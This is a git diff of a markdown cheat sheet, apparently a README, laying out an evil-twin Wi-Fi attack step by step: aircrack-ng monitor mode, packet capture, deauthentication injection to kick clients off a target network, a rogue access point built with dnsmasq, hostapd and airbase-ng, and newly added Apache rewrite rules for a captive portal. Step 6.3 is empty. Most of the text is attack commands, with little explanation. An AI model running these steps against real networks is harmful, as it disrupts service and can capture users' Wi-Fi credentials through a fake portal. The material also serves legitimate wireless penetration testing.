@@ -6,18 +6,26 @@
   - [1.1] Cheking for Wireless Network interface: `iwconfig`  
   - [1.2] Cheking for Wireless Network interface: `ifconfig`
 
+---
+
 # [2] Start Monitoring Mode & Checking Injection Option 
   - [2.1] Starting Monitor mode: `airmon-ng start $INTERFACE`
   - [2.2] Monitoring: `aireplay-ng --test $INTERFACE`
+
+---
   
 # [3] Scan Wireless’s Area
   - [3.1] Sniff Networks Area Information : `airodump-ng $INTERFACE`
   - [3.2] Start Capturing Packets: `airodump-ng --bssid $BSSID -c $CHANNEL_NUMBER -w $OUTPUT_NAME $INTERFACE`
   - [3.3] Inject Packets into Wireless Network: `aireplay-ng --deauth 10 -a $MAC_TARGET $INTERFACE`
 
+---
+
 # [4] Analysis Captured Files With WireShark:
   - [4.1] Start WireShark: `wireshark $OUTPUT_NAME.cap`
     - Looking for Authentication Files
+
+---
 
 # [5] Set Up Access point:
   - [5.1] Create dnsmasq Configuration files: `nano dnsmasq.conf`
@@ -54,7 +62,27 @@ driver=nl80211
   - [5.3] Run Commands 1: `dnsmasq -C /directory_to_dnsmasq.conf`
   - [5.4] Run Commands 2: `hostapd /directory_to_hostapd.conf -B`
   - [5.5] `airbase-ng -e $WIRELESS_NETWORK -c $CHANNEL $INTERFACE` 
-  - 
+
+---
+
+# [6] Setting up Captive Portal
+  - [6.1] Download and Move Portal files to `/var/www/html`
+  - [6.2] Add to end of file: `nano /etc/apache2/sites-enabled/000-default.conf`
+```shell
+
+<Directory "/var/www/html">
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ / [L,QSA]
+</Directory>
+
+```
+  - [6.3] 
  
  ---
  
